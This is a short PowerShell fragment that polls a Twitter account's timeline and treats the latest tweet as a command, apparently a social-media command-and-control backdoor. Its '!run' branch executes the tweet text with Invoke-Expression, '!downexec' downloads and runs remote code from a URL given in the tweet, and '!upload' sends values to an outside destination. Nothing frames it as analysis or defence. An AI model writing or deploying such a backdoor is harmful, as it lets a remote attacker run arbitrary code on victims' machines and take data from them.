$endpoint = "http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=$account"
$client = New-Object System.Net.WebClient
[xml] $reply = $client.DownloadString($endpoint)
$message = $reply.statuses.status.text
$action = $message.split('|')[0]
switch ($action) {
 !run { Invoke-Expression $message.Substring(5) }
 !downexec { Invoke-Expression ($client.DownloadString($message.split('|')[1])) }
 !upload { $client.UploadValues($destination, $values) }
}
